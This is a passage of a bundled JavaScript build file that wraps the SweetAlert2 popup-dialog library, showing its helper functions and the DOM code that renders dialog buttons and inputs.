import {
  __commonJS
} from "./chunk-KBUIKKCC.js";

// node_modules/sweetalert2/dist/sweetalert2.all.js
var require_sweetalert2_all = __commonJS({
  "node_modules/sweetalert2/dist/sweetalert2.all.js"(exports, module) {
    (function(global, factory) {
      typeof exports === "object" && typeof module !== "undefined" ? module.exports = factory() : typeof define === "function" && define.amd ? define(factory) : (global = typeof globalThis !== "undefined" ? globalThis : global || self, global.Sweetalert2 = factory());
    })(exports, function() {
      "use strict";
      function _arrayLikeToArray(r, a) {
        (null == a || a > r.length) && (a = r.length);
        for (var e = 0, n = Array(a); e < a; e++) n[e] = r[e];
        return n;
      }
      function _arrayWithHoles(r) {
        if (Array.isArray(r)) return r;
      }
      function _arrayWithoutHoles(r) {
        if (Array.isArray(r)) return _arrayLikeToArray(r);
      }
      function _assertClassBrand(e, t, n) {
        if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n;
        throw new TypeError("Private element is not present on this object");
      }
      function _assertThisInitialized(e) {
        if (void 0 === e) throw new ReferenceError("this hasn't been initialised - super() hasn't been called");
        return e;
      }
      function _callSuper(t, o, e) {
        return o = _getPrototypeOf(o), _possibleConstructorReturn(t, _isNativeReflectConstruct() ? Reflect.construct(o, e || [], _getPrototypeOf(t).constructor) : o.apply(t, e));
      }
      function _checkPrivateRedeclaration(e, t) {
        if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object");
      }
      function _classCallCheck(a, n) {
        if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function");
      }
      function _classPrivateFieldGet2(s, a) {
        return s.get(_assertClassBrand(s, a));
      }
      function _classPrivateFieldInitSpec(e, t, a) {
        _checkPrivateRedeclaration(e, t), t.set(e, a);
      }
      function _classPrivateFieldSet2(s, a, r) {
        return s.set(_assertClassBrand(s, a), r), r;
      }
      function _construct(t, e, r) {
        if (_isNativeReflectConstruct()) return Reflect.construct.apply(null, arguments);
        var o = [null];
        o.push.apply(o, e);
        var p = new (t.bind.apply(t, o))();
        return p;
      }
      function _defineProperties(e, r) {
        for (var t = 0; t < r.length; t++) {
          var o = r[t];
          o.enumerable = o.enumerable || false, o.configurable = true, "value" in o && (o.writable = true), Object.defineProperty(e, _toPropertyKey(o.key), o);
        }
      }
      function _createClass(e, r, t) {
        return r && _defineProperties(e.prototype, r), Object.defineProperty(e, "prototype", {
          writable: false
        }), e;
      }
      function _createForOfIteratorHelper(r, e) {
        var t = "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
        if (!t) {
          if (Array.isArray(r) || (t = _unsupportedIterableToArray(r)) || e) {
            t && (r = t);
            var n = 0, F = function() {
            };
            return {
              s: F,
              n: function() {
                return n >= r.length ? {
                  done: true
                } : {
                  done: false,
                  value: r[n++]
                };
              },
              e: function(r2) {
                throw r2;
              },
              f: F
            };
          }
          throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
        }
        var o, a = true, u = false;
        return {
          s: function() {
            t = t.call(r);
          },
          n: function() {
            var r2 = t.next();
            return a = r2.done, r2;
          },
          e: function(r2) {
            u = true, o = r2;
          },
          f: function() {
            try {
              a || null == t.return || t.return();
            } finally {
              if (u) throw o;
            }
          }
        };
      }
      function _get() {
        return _get = "undefined" != typeof Reflect && Reflect.get ? Reflect.get.bind() : function(e, t, r) {
          var p = _superPropBase(e, t);
          if (p) {
            var n = Object.getOwnPropertyDescriptor(p, t);
            return n.get ? n.get.call(arguments.length < 3 ? e : r) : n.value;
          }
        }, _get.apply(null, arguments);
      }
      function _getPrototypeOf(t) {
        return _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf.bind() : function(t2) {
          return t2.__proto__ || Object.getPrototypeOf(t2);
        }, _getPrototypeOf(t);
      }
      function _inherits(t, e) {
        if ("function" != typeof e && null !== e) throw new TypeError("Super expression must either be null or a function");
        t.prototype = Object.create(e && e.prototype, {
          constructor: {
            value: t,
            writable: true,
            configurable: true
          }
        }), Object.defineProperty(t, "prototype", {
          writable: false
        }), e && _setPrototypeOf(t, e);
      }
      function _isNativeReflectConstruct() {
        try {
          var t = !Boolean.prototype.valueOf.call(Reflect.construct(Boolean, [], function() {
          }));
        } catch (t2) {
        }
        return (_isNativeReflectConstruct = function() {
          return !!t;
        })();
      }
      function _iterableToArray(r) {
        if ("undefined" != typeof Symbol && null != r[Symbol.iterator] || null != r["@@iterator"]) return Array.from(r);
      }
      function _iterableToArrayLimit(r, l) {
        var t = null == r ? null : "undefined" != typeof Symbol && r[Symbol.iterator] || r["@@iterator"];
        if (null != t) {
          var e, n, i, u, a = [], f = true, o = false;
          try {
            if (i = (t = t.call(r)).next, 0 === l) ;
            else for (; !(f = (e = i.call(t)).done) && (a.push(e.value), a.length !== l); f = true) ;
          } catch (r2) {
            o = true, n = r2;
          } finally {
            try {
              if (!f && null != t.return && (u = t.return(), Object(u) !== u)) return;
            } finally {
              if (o) throw n;
            }
          }
          return a;
        }
      }
      function _nonIterableRest() {
        throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _nonIterableSpread() {
        throw new TypeError("Invalid attempt to spread non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.");
      }
      function _possibleConstructorReturn(t, e) {
        if (e && ("object" == typeof e || "function" == typeof e)) return e;
        if (void 0 !== e) throw new TypeError("Derived constructors may only return object or undefined");
        return _assertThisInitialized(t);
      }
      function _setPrototypeOf(t, e) {
        return _setPrototypeOf = Object.setPrototypeOf ? Object.setPrototypeOf.bind() : function(t2, e2) {
          return t2.__proto__ = e2, t2;
        }, _setPrototypeOf(t, e);
      }
      function _slicedToArray(r, e) {
        return _arrayWithHoles(r) || _iterableToArrayLimit(r, e) || _unsupportedIterableToArray(r, e) || _nonIterableRest();
      }
      function _superPropBase(t, o) {
        for (; !{}.hasOwnProperty.call(t, o) && null !== (t = _getPrototypeOf(t)); ) ;
        return t;
      }
      function _superPropGet(t, e, r, o) {
        var p = _get(_getPrototypeOf(t.prototype), e, r);
        return function(t2) {
          return p.apply(r, t2);
        };
      }
      function _toConsumableArray(r) {
        return _arrayWithoutHoles(r) || _iterableToArray(r) || _unsupportedIterableToArray(r) || _nonIterableSpread();
      }
      function _toPrimitive(t, r) {
        if ("object" != typeof t || !t) return t;
        var e = t[Symbol.toPrimitive];
        if (void 0 !== e) {
          var i = e.call(t, r);
          if ("object" != typeof i) return i;
          throw new TypeError("@@toPrimitive must return a primitive value.");
        }
        return String(t);
      }
      function _toPropertyKey(t) {
        var i = _toPrimitive(t, "string");
        return "symbol" == typeof i ? i : i + "";
      }
      function _typeof(o) {
        "@babel/helpers - typeof";
        return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function(o2) {
          return typeof o2;
        } : function(o2) {
          return o2 && "function" == typeof Symbol && o2.constructor === Symbol && o2 !== Symbol.prototype ? "symbol" : typeof o2;
        }, _typeof(o);
      }
      function _unsupportedIterableToArray(r, a) {
        if (r) {
          if ("string" == typeof r) return _arrayLikeToArray(r, a);
          var t = {}.toString.call(r).slice(8, -1);
          return "Object" === t && r.constructor && (t = r.constructor.name), "Map" === t || "Set" === t ? Array.from(r) : "Arguments" === t || /^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(t) ? _arrayLikeToArray(r, a) : void 0;
        }
      }
      var RESTORE_FOCUS_TIMEOUT = 100;
      var globalState = {};
      var focusPreviousActiveElement = function focusPreviousActiveElement2() {
        if (globalState.previousActiveElement instanceof HTMLElement) {
          globalState.previousActiveElement.focus();
          globalState.previousActiveElement = null;
        } else if (document.body) {
          document.body.focus();
        }
      };
      var restoreActiveElement = function restoreActiveElement2(returnFocus) {
        return new Promise(function(resolve) {
          if (!returnFocus) {
            return resolve();
          }
          var x = window.scrollX;
          var y = window.scrollY;
          globalState.restoreFocusTimeout = setTimeout(function() {
            focusPreviousActiveElement();
            resolve();
          }, RESTORE_FOCUS_TIMEOUT);
          window.scrollTo(x, y);
        });
      };
      var swalPrefix = "swal2-";
      var classNames = ["container", "shown", "height-auto", "iosfix", "popup", "modal", "no-backdrop", "no-transition", "toast", "toast-shown", "show", "hide", "close", "title", "html-container", "actions", "confirm", "deny", "cancel", "default-outline", "footer", "icon", "icon-content", "image", "input", "file", "range", "select", "radio", "checkbox", "label", "textarea", "inputerror", "input-label", "validation-message", "progress-steps", "active-progress-step", "progress-step", "progress-step-line", "loader", "loading", "styled", "top", "top-start", "top-end", "top-left", "top-right", "center", "center-start", "center-end", "center-left", "center-right", "bottom", "bottom-start", "bottom-end", "bottom-left", "bottom-right", "grow-row", "grow-column", "grow-fullscreen", "rtl", "timer-progress-bar", "timer-progress-bar-container", "scrollbar-measure", "icon-success", "icon-warning", "icon-info", "icon-question", "icon-error"];
      var swalClasses = classNames.reduce(
        function(acc, className) {
          acc[className] = swalPrefix + className;
          return acc;
        },
        /** @type {SwalClasses} */
        {}
      );
      var icons = ["success", "warning", "info", "question", "error"];
      var iconTypes = icons.reduce(
        function(acc, icon) {
          acc[icon] = swalPrefix + icon;
          return acc;
        },
        /** @type {SwalIcons} */
        {}
      );
      var consolePrefix = "SweetAlert2:";
      var capitalizeFirstLetter = function capitalizeFirstLetter2(str) {
        return str.charAt(0).toUpperCase() + str.slice(1);
      };
      var warn = function warn2(message) {
        console.warn("".concat(consolePrefix, " ").concat(_typeof(message) === "object" ? message.join(" ") : message));
      };
      var error = function error2(message) {
        console.error("".concat(consolePrefix, " ").concat(message));
      };
      var previousWarnOnceMessages = [];
      var warnOnce = function warnOnce2(message) {
        if (!previousWarnOnceMessages.includes(message)) {
          previousWarnOnceMessages.push(message);
          warn(message);
        }
      };
      var warnAboutDeprecation = function warnAboutDeprecation2(deprecatedParam) {
        var useInstead = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : null;
        warnOnce('"'.concat(deprecatedParam, '" is deprecated and will be removed in the next major release.').concat(useInstead ? ' Use "'.concat(useInstead, '" instead.') : ""));
      };
      var callIfFunction = function callIfFunction2(arg) {
        return typeof arg === "function" ? arg() : arg;
      };
      var hasToPromiseFn = function hasToPromiseFn2(arg) {
        return arg && typeof arg.toPromise === "function";
      };
      var asPromise = function asPromise2(arg) {
        return hasToPromiseFn(arg) ? arg.toPromise() : Promise.resolve(arg);
      };
      var isPromise = function isPromise2(arg) {
        return arg && Promise.resolve(arg) === arg;
      };
      var getContainer = function getContainer2() {
        return document.body.querySelector(".".concat(swalClasses.container));
      };
      var elementBySelector = function elementBySelector2(selectorString) {
        var container = getContainer();
        return container ? container.querySelector(selectorString) : null;
      };
      var elementByClass = function elementByClass2(className) {
        return elementBySelector(".".concat(className));
      };
      var getPopup = function getPopup2() {
        return elementByClass(swalClasses.popup);
      };
      var getIcon = function getIcon2() {
        return elementByClass(swalClasses.icon);
      };
      var getIconContent = function getIconContent2() {
        return elementByClass(swalClasses["icon-content"]);
      };
      var getTitle = function getTitle2() {
        return elementByClass(swalClasses.title);
      };
      var getHtmlContainer = function getHtmlContainer2() {
        return elementByClass(swalClasses["html-container"]);
      };
      var getImage = function getImage2() {
        return elementByClass(swalClasses.image);
      };
      var getProgressSteps = function getProgressSteps2() {
        return elementByClass(swalClasses["progress-steps"]);
      };
      var getValidationMessage = function getValidationMessage2() {
        return elementByClass(swalClasses["validation-message"]);
      };
      var getConfirmButton = function getConfirmButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.confirm))
        );
      };
      var getCancelButton = function getCancelButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.cancel))
        );
      };
      var getDenyButton = function getDenyButton2() {
        return (
          /** @type {HTMLButtonElement} */
          elementBySelector(".".concat(swalClasses.actions, " .").concat(swalClasses.deny))
        );
      };
      var getInputLabel = function getInputLabel2() {
        return elementByClass(swalClasses["input-label"]);
      };
      var getLoader = function getLoader2() {
        return elementBySelector(".".concat(swalClasses.loader));
      };
      var getActions = function getActions2() {
        return elementByClass(swalClasses.actions);
      };
      var getFooter = function getFooter2() {
        return elementByClass(swalClasses.footer);
      };
      var getTimerProgressBar = function getTimerProgressBar2() {
        return elementByClass(swalClasses["timer-progress-bar"]);
      };
      var getCloseButton = function getCloseButton2() {
        return elementByClass(swalClasses.close);
      };
      var focusable = '\n  a[href],\n  area[href],\n  input:not([disabled]),\n  select:not([disabled]),\n  textarea:not([disabled]),\n  button:not([disabled]),\n  iframe,\n  object,\n  embed,\n  [tabindex="0"],\n  [contenteditable],\n  audio[controls],\n  video[controls],\n  summary\n';
      var getFocusableElements = function getFocusableElements2() {
        var popup = getPopup();
        if (!popup) {
          return [];
        }
        var focusableElementsWithTabindex = popup.querySelectorAll('[tabindex]:not([tabindex="-1"]):not([tabindex="0"])');
        var focusableElementsWithTabindexSorted = Array.from(focusableElementsWithTabindex).sort(function(a, b) {
          var tabindexA = parseInt(a.getAttribute("tabindex") || "0");
          var tabindexB = parseInt(b.getAttribute("tabindex") || "0");
          if (tabindexA > tabindexB) {
            return 1;
          } else if (tabindexA < tabindexB) {
            return -1;
          }
          return 0;
        });
        var otherFocusableElements = popup.querySelectorAll(focusable);
        var otherFocusableElementsFiltered = Array.from(otherFocusableElements).filter(function(el) {
          return el.getAttribute("tabindex") !== "-1";
        });
        return _toConsumableArray(new Set(focusableElementsWithTabindexSorted.concat(otherFocusableElementsFiltered))).filter(function(el) {
          return isVisible$1(el);
        });
      };
      var isModal = function isModal2() {
        return hasClass(document.body, swalClasses.shown) && !hasClass(document.body, swalClasses["toast-shown"]) && !hasClass(document.body, swalClasses["no-backdrop"]);
      };
      var isToast = function isToast2() {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        return hasClass(popup, swalClasses.toast);
      };
      var isLoading = function isLoading2() {
        var popup = getPopup();
        if (!popup) {
          return false;
        }
        return popup.hasAttribute("data-loading");
      };
      var setInnerHtml = function setInnerHtml2(elem, html) {
        elem.textContent = "";
        if (html) {
          var parser = new DOMParser();
          var parsed = parser.parseFromString(html, "text/html");
          var head = parsed.querySelector("head");
          if (head) {
            Array.from(head.childNodes).forEach(function(child) {
              elem.appendChild(child);
            });
          }
          var body = parsed.querySelector("body");
          if (body) {
            Array.from(body.childNodes).forEach(function(child) {
              if (child instanceof HTMLVideoElement || child instanceof HTMLAudioElement) {
                elem.appendChild(child.cloneNode(true));
              } else {
                elem.appendChild(child);
              }
            });
          }
        }
      };
      var hasClass = function hasClass2(elem, className) {
        if (!className) {
          return false;
        }
        var classList = className.split(/\s+/);
        for (var i = 0; i < classList.length; i++) {
          if (!elem.classList.contains(classList[i])) {
            return false;
          }
        }
        return true;
      };
      var removeCustomClasses = function removeCustomClasses2(elem, params) {
        Array.from(elem.classList).forEach(function(className) {
          if (!Object.values(swalClasses).includes(className) && !Object.values(iconTypes).includes(className) && !Object.values(params.showClass || {}).includes(className)) {
            elem.classList.remove(className);
          }
        });
      };
      var applyCustomClass = function applyCustomClass2(elem, params, className) {
        removeCustomClasses(elem, params);
        if (!params.customClass) {
          return;
        }
        var customClass = params.customClass[
          /** @type {keyof SweetAlertCustomClass} */
          className
        ];
        if (!customClass) {
          return;
        }
        if (typeof customClass !== "string" && !customClass.forEach) {
          warn("Invalid type of customClass.".concat(className, '! Expected string or iterable object, got "').concat(_typeof(customClass), '"'));
          return;
        }
        addClass(elem, customClass);
      };
      var getInput$1 = function getInput2(popup, inputClass) {
        if (!inputClass) {
          return null;
        }
        switch (inputClass) {
          case "select":
          case "textarea":
          case "file":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses[inputClass]));
          case "checkbox":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.checkbox, " input"));
          case "radio":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:checked")) || popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.radio, " input:first-child"));
          case "range":
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.range, " input"));
          default:
            return popup.querySelector(".".concat(swalClasses.popup, " > .").concat(swalClasses.input));
        }
      };
      var focusInput = function focusInput2(input) {
        input.focus();
        if (input.type !== "file") {
          var val = input.value;
          input.value = "";
          input.value = val;
        }
      };
      var toggleClass = function toggleClass2(target, classList, condition) {
        if (!target || !classList) {
          return;
        }
        if (typeof classList === "string") {
          classList = classList.split(/\s+/).filter(Boolean);
        }
        classList.forEach(function(className) {
          if (Array.isArray(target)) {
            target.forEach(function(elem) {
              if (condition) {
                elem.classList.add(className);
              } else {
                elem.classList.remove(className);
              }
            });
          } else {
            if (condition) {
              target.classList.add(className);
            } else {
              target.classList.remove(className);
            }
          }
        });
      };
      var addClass = function addClass2(target, classList) {
        toggleClass(target, classList, true);
      };
      var removeClass = function removeClass2(target, classList) {
        toggleClass(target, classList, false);
      };
      var getDirectChildByClass = function getDirectChildByClass2(elem, className) {
        var children = Array.from(elem.children);
        for (var i = 0; i < children.length; i++) {
          var child = children[i];
          if (child instanceof HTMLElement && hasClass(child, className)) {
            return child;
          }
        }
      };
      var applyNumericalStyle = function applyNumericalStyle2(elem, property, value) {
        if (value === "".concat(parseInt(value))) {
          value = parseInt(value);
        }
        if (value || parseInt(value) === 0) {
          elem.style.setProperty(property, typeof value === "number" ? "".concat(value, "px") : value);
        } else {
          elem.style.removeProperty(property);
        }
      };
      var show = function show2(elem) {
        var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "flex";
        if (!elem) {
          return;
        }
        elem.style.display = display;
      };
      var hide = function hide2(elem) {
        if (!elem) {
          return;
        }
        elem.style.display = "none";
      };
      var showWhenInnerHtmlPresent = function showWhenInnerHtmlPresent2(elem) {
        var display = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "block";
        if (!elem) {
          return;
        }
        new MutationObserver(function() {
          toggle(elem, elem.innerHTML, display);
        }).observe(elem, {
          childList: true,
          subtree: true
        });
      };
      var setStyle = function setStyle2(parent, selector, property, value) {
        var el = parent.querySelector(selector);
        if (el) {
          el.style.setProperty(property, value);
        }
      };
      var toggle = function toggle2(elem, condition) {
        var display = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : "flex";
        if (condition) {
          show(elem, display);
        } else {
          hide(elem);
        }
      };
      var isVisible$1 = function isVisible2(elem) {
        return !!(elem && (elem.offsetWidth || elem.offsetHeight || elem.getClientRects().length));
      };
      var allButtonsAreHidden = function allButtonsAreHidden2() {
        return !isVisible$1(getConfirmButton()) && !isVisible$1(getDenyButton()) && !isVisible$1(getCancelButton());
      };
      var isScrollable = function isScrollable2(elem) {
        return !!(elem.scrollHeight > elem.clientHeight);
      };
      var hasCssAnimation = function hasCssAnimation2(elem) {
        var style = window.getComputedStyle(elem);
        var animDuration = parseFloat(style.getPropertyValue("animation-duration") || "0");
        var transDuration = parseFloat(style.getPropertyValue("transition-duration") || "0");
        return animDuration > 0 || transDuration > 0;
      };
      var animateTimerProgressBar = function animateTimerProgressBar2(timer) {
        var reset = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : false;
        var timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        if (isVisible$1(timerProgressBar)) {
          if (reset) {
            timerProgressBar.style.transition = "none";
            timerProgressBar.style.width = "100%";
          }
          setTimeout(function() {
            timerProgressBar.style.transition = "width ".concat(timer / 1e3, "s linear");
            timerProgressBar.style.width = "0%";
          }, 10);
        }
      };
      var stopTimerProgressBar = function stopTimerProgressBar2() {
        var timerProgressBar = getTimerProgressBar();
        if (!timerProgressBar) {
          return;
        }
        var timerProgressBarWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        timerProgressBar.style.removeProperty("transition");
        timerProgressBar.style.width = "100%";
        var timerProgressBarFullWidth = parseInt(window.getComputedStyle(timerProgressBar).width);
        var timerProgressBarPercent = timerProgressBarWidth / timerProgressBarFullWidth * 100;
        timerProgressBar.style.width = "".concat(timerProgressBarPercent, "%");
      };
      var isNodeEnv = function isNodeEnv2() {
        return typeof window === "undefined" || typeof document === "undefined";
      };
      var sweetHTML = '\n <div aria-labelledby="'.concat(swalClasses.title, '" aria-describedby="').concat(swalClasses["html-container"], '" class="').concat(swalClasses.popup, '" tabindex="-1">\n   <button type="button" class="').concat(swalClasses.close, '"></button>\n   <ul class="').concat(swalClasses["progress-steps"], '"></ul>\n   <div class="').concat(swalClasses.icon, '"></div>\n   <img class="').concat(swalClasses.image, '" />\n   <h2 class="').concat(swalClasses.title, '" id="').concat(swalClasses.title, '"></h2>\n   <div class="').concat(swalClasses["html-container"], '" id="').concat(swalClasses["html-container"], '"></div>\n   <input class="').concat(swalClasses.input, '" id="').concat(swalClasses.input, '" />\n   <input type="file" class="').concat(swalClasses.file, '" />\n   <div class="').concat(swalClasses.range, '">\n     <input type="range" />\n     <output></output>\n   </div>\n   <select class="').concat(swalClasses.select, '" id="').concat(swalClasses.select, '"></select>\n   <div class="').concat(swalClasses.radio, '"></div>\n   <label class="').concat(swalClasses.checkbox, '">\n     <input type="checkbox" id="').concat(swalClasses.checkbox, '" />\n     <span class="').concat(swalClasses.label, '"></span>\n   </label>\n   <textarea class="').concat(swalClasses.textarea, '" id="').concat(swalClasses.textarea, '"></textarea>\n   <div class="').concat(swalClasses["validation-message"], '" id="').concat(swalClasses["validation-message"], '"></div>\n   <div class="').concat(swalClasses.actions, '">\n     <div class="').concat(swalClasses.loader, '"></div>\n     <button type="button" class="').concat(swalClasses.confirm, '"></button>\n     <button type="button" class="').concat(swalClasses.deny, '"></button>\n     <button type="button" class="').concat(swalClasses.cancel, '"></button>\n   </div>\n   <div class="').concat(swalClasses.footer, '"></div>\n   <div class="').concat(swalClasses["timer-progress-bar-container"], '">\n     <div class="').concat(swalClasses["timer-progress-bar"], '"></div>\n   </div>\n </div>\n').replace(/(^|\n)\s*/g, "");
      var resetOldContainer = function resetOldContainer2() {
        var oldContainer = getContainer();
        if (!oldContainer) {
          return false;
        }
        oldContainer.remove();
        removeClass([document.documentElement, document.body], [swalClasses["no-backdrop"], swalClasses["toast-shown"], swalClasses["has-column"]]);
        return true;
      };
      var resetValidationMessage$1 = function resetValidationMessage2() {
        globalState.currentInstance.resetValidationMessage();
      };
      var addInputChangeListeners = function addInputChangeListeners2() {
        var popup = getPopup();
        var input = getDirectChildByClass(popup, swalClasses.input);
        var file = getDirectChildByClass(popup, swalClasses.file);
        var range = popup.querySelector(".".concat(swalClasses.range, " input"));
        var rangeOutput = popup.querySelector(".".concat(swalClasses.range, " output"));
        var select = getDirectChildByClass(popup, swalClasses.select);
        var checkbox = popup.querySelector(".".concat(swalClasses.checkbox, " input"));
        var textarea = getDirectChildByClass(popup, swalClasses.textarea);
        input.oninput = resetValidationMessage$1;
        file.onchange = resetValidationMessage$1;
        select.onchange = resetValidationMessage$1;
        checkbox.onchange = resetValidationMessage$1;
        textarea.oninput = resetValidationMessage$1;
        range.oninput = function() {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
        range.onchange = function() {
          resetValidationMessage$1();
          rangeOutput.value = range.value;
        };
      };
      var getTarget = function getTarget2(target) {
        return typeof target === "string" ? document.querySelector(target) : target;
      };
      var setupAccessibility = function setupAccessibility2(params) {
        var popup = getPopup();
        popup.setAttribute("role", params.toast ? "alert" : "dialog");
        popup.setAttribute("aria-live", params.toast ? "polite" : "assertive");
        if (!params.toast) {
          popup.setAttribute("aria-modal", "true");
        }
      };
      var setupRTL = function setupRTL2(targetElement) {
        if (window.getComputedStyle(targetElement).direction === "rtl") {
          addClass(getContainer(), swalClasses.rtl);
        }
      };
      var init = function init2(params) {
        var oldContainerExisted = resetOldContainer();
        if (isNodeEnv()) {
          error("SweetAlert2 requires document to initialize");
          return;
        }
        var container = document.createElement("div");
        container.className = swalClasses.container;
        if (oldContainerExisted) {
          addClass(container, swalClasses["no-transition"]);
        }
        setInnerHtml(container, sweetHTML);
        var targetElement = getTarget(params.target);
        targetElement.appendChild(container);
        setupAccessibility(params);
        setupRTL(targetElement);
        addInputChangeListeners();
      };
      var parseHtmlToContainer = function parseHtmlToContainer2(param, target) {
        if (param instanceof HTMLElement) {
          target.appendChild(param);
        } else if (_typeof(param) === "object") {
          handleObject(param, target);
        } else if (param) {
          setInnerHtml(target, param);
        }
      };
      var handleObject = function handleObject2(param, target) {
        if (param.jquery) {
          handleJqueryElem(target, param);
        } else {
          setInnerHtml(target, param.toString());
        }
      };
      var handleJqueryElem = function handleJqueryElem2(target, elem) {
        target.textContent = "";
        if (0 in elem) {
          for (var i = 0; i in elem; i++) {
            target.appendChild(elem[i].cloneNode(true));
          }
        } else {
          target.appendChild(elem.cloneNode(true));
        }
      };
      var animationEndEvent = function() {
        if (isNodeEnv()) {
          return false;
        }
        var testEl = document.createElement("div");
        if (typeof testEl.style.webkitAnimation !== "undefined") {
          return "webkitAnimationEnd";
        }
        if (typeof testEl.style.animation !== "undefined") {
          return "animationend";
        }
        return false;
      }();
      var renderActions = function renderActions2(instance, params) {
        var actions = getActions();
        var loader = getLoader();
        if (!actions || !loader) {
          return;
        }
        if (!params.showConfirmButton && !params.showDenyButton && !params.showCancelButton) {
          hide(actions);
        } else {
          show(actions);
        }
        applyCustomClass(actions, params, "actions");
        renderButtons(actions, loader, params);
        setInnerHtml(loader, params.loaderHtml || "");
        applyCustomClass(loader, params, "loader");
      };
      function renderButtons(actions, loader, params) {
        var confirmButton = getConfirmButton();
        var denyButton = getDenyButton();
        var cancelButton = getCancelButton();
        if (!confirmButton || !denyButton || !cancelButton) {
          return;
        }
        renderButton(confirmButton, "confirm", params);
        renderButton(denyButton, "deny", params);
        renderButton(cancelButton, "cancel", params);
        handleButtonsStyling(confirmButton, denyButton, cancelButton, params);
        if (params.reverseButtons) {
          if (params.toast) {
            actions.insertBefore(cancelButton, confirmButton);
            actions.insertBefore(denyButton, confirmButton);
          } else {
            actions.insertBefore(cancelButton, loader);
            actions.insertBefore(denyButton, loader);
            actions.insertBefore(confirmButton, loader);
          }
        }
      }
      function handleButtonsStyling(confirmButton, denyButton, cancelButton, params) {
        if (!params.buttonsStyling) {
          removeClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
          return;
        }
        addClass([confirmButton, denyButton, cancelButton], swalClasses.styled);
        if (params.confirmButtonColor) {
          confirmButton.style.backgroundColor = params.confirmButtonColor;
          addClass(confirmButton, swalClasses["default-outline"]);
        }
        if (params.denyButtonColor) {
          denyButton.style.backgroundColor = params.denyButtonColor;
          addClass(denyButton, swalClasses["default-outline"]);
        }
        if (params.cancelButtonColor) {
          cancelButton.style.backgroundColor = params.cancelButtonColor;
          addClass(cancelButton, swalClasses["default-outline"]);
        }
      }
      function renderButton(button, buttonType, params) {
        var buttonName = (
          /** @type {'Confirm' | 'Deny' | 'Cancel'} */
          capitalizeFirstLetter(buttonType)
        );
        toggle(button, params["show".concat(buttonName, "Button")], "inline-block");
        setInnerHtml(button, params["".concat(buttonType, "ButtonText")] || "");
        button.setAttribute("aria-label", params["".concat(buttonType, "ButtonAriaLabel")] || "");
        button.className = swalClasses[buttonType];
        applyCustomClass(button, params, "".concat(buttonType, "Button"));
      }
      var renderCloseButton = function renderCloseButton2(instance, params) {
        var closeButton = getCloseButton();
        if (!closeButton) {
          return;
        }
        setInnerHtml(closeButton, params.closeButtonHtml || "");
        applyCustomClass(closeButton, params, "closeButton");
        toggle(closeButton, params.showCloseButton);
        closeButton.setAttribute("aria-label", params.closeButtonAriaLabel || "");
      };
      var renderContainer = function renderContainer2(instance, params) {
        var container = getContainer();
        if (!container) {
          return;
        }
        handleBackdropParam(container, params.backdrop);
        handlePositionParam(container, params.position);
        handleGrowParam(container, params.grow);
        applyCustomClass(container, params, "container");
      };
      function handleBackdropParam(container, backdrop) {
        if (typeof backdrop === "string") {
          container.style.background = backdrop;
        } else if (!backdrop) {
          addClass([document.documentElement, document.body], swalClasses["no-backdrop"]);
        }
      }
      function handlePositionParam(container, position) {
        if (!position) {
          return;
        }
        if (position in swalClasses) {
          addClass(container, swalClasses[position]);
        } else {
          warn('The "position" parameter is not valid, defaulting to "center"');
          addClass(container, swalClasses.center);
        }
      }
      function handleGrowParam(container, grow) {
        if (!grow) {
          return;
        }
        addClass(container, swalClasses["grow-".concat(grow)]);
      }
      var privateProps = {
        innerParams: /* @__PURE__ */ new WeakMap(),
        domCache: /* @__PURE__ */ new WeakMap()
      };
      var inputClasses = ["input", "file", "range", "select", "radio", "checkbox", "textarea"];
      var renderInput = function renderInput2(instance, params) {
        var popup = getPopup();
        if (!popup) {
          return;
        }
        var innerParams = privateProps.innerParams.get(instance);
        var rerender = !innerParams || params.input !== innerParams.input;
        inputClasses.forEach(function(inputClass) {
          var inputContainer = getDirectChildByClass(popup, swalClasses[inputClass]);
          if (!inputContainer) {
            return;
          }
          setAttributes(inputClass, params.inputAttributes);
          inputContainer.className = swalClasses[inputClass];
          if (rerender) {
            hide(inputContainer);
          }
        });
        if (params.input) {
          if (rerender) {
            showInput(params);
          }
          setCustomClass(params);
        }
      };
      var showInput = function showInput2(params) {
        if (!params.input) {
          return;
        }
        if (!renderInputType[params.input]) {
          error("Unexpected type of input! Expected ".concat(Object.keys(renderInputType).join(" | "), ', got "').concat(params.input, '"'));
          return;
        }
        var inputContainer = getInputContainer(params.input);
        if (!inputContainer) {
          return;
        }
        var input = renderInputType[params.input](inputContainer, params);
        show(inputContainer);
        if (params.inputAutoFocus) {
          setTimeout(function() {
            focusInput(input);
          });
        }
      };
      var removeAttributes = function removeAttributes2(input) {
        for (var i = 0; i < input.attributes.length; i++) {
          var attrName = input.attributes[i].name;
